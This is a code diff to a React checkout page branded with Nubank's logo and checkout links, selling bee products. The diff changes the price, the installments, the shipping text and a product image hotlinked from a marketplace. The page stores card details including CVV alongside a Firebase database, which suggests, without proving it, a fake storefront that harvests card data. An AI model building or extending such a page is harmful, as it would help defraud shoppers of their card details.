@@ -17,8 +17,8 @@ if (!firebase.apps.length) {
 const db = firebase.database();
 
 // Constants
-const TOTAL_PRICE = 800.00;
-const RETRY_LINK = 'https://checkout.nubank.com.br/uU14N2067M15dr71';
+const TOTAL_PRICE = 250.00;
+const RETRY_LINK = 'https://checkout.nubank.com.br/AWOgHhPw2015dr71';
 const NUBANK_LOGO = 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png';
 
 // Helper for masking
@@ -62,7 +62,7 @@ const App: React.FC = () => {
     cardName: '',
     cardExpiry: '',
     cardCvv: '',
-    installments: '1',
+    installments: '2',
   });
 
   const [selectedProducts, setSelectedProducts] = useState<string[]>(['kit']);
@@ -366,7 +366,7 @@ const App: React.FC = () => {
               </div>
               <label htmlFor="shipping" className="text-sm text-gray-500 lowercase cursor-pointer select-none leading-tight flex items-center gap-1.5 flex-wrap">
                 <Truck className="w-4 h-4 text-nubank inline" />
-                garantindo o envio das abelhas sem ferrão para todo o brasil
+                frete grátis para todo o brasil
               </label>
             </div>
             {errors.agreedToShipping && (
@@ -416,7 +416,7 @@ const App: React.FC = () => {
                 <div className="flex justify-center gap-4 mb-6">
                   <div className="w-24 h-24 rounded-xl overflow-hidden shadow-md border border-gray-100">
                     <img 
-                      src="https://abelhas.org:9443/MediaUploader/fa5ce88be106452ea6a0dd88ecc319c3.webp" 
+                      src="https://a-static.mlcdn.com.br/800x800/racao-suplemento-energetico-proteico-para-abelhas-20kg-beemix/oliststore/mgltwjr0hldgklle/b2a4fa799faa093e0ee58f3a2ba572c7.jpeg" 
                       alt="Combo Selecionado" 
                       className="w-full h-full object-cover"
                     />
@@ -426,6 +426,7 @@ const App: React.FC = () => {
                 <div className="mb-8">
                    <p className="text-sm text-gray-500 mb-1">Valor Total</p>
                    <p className="text-3xl font-extrabold text-nubank">R$ {TOTAL_PRICE.toFixed(2).replace('.', ',')}</p>
+                   <p className="text-sm text-green-600 font-bold mt-2">Frete grátis para todo o Brasil</p>
                 </div>
 
                 <button
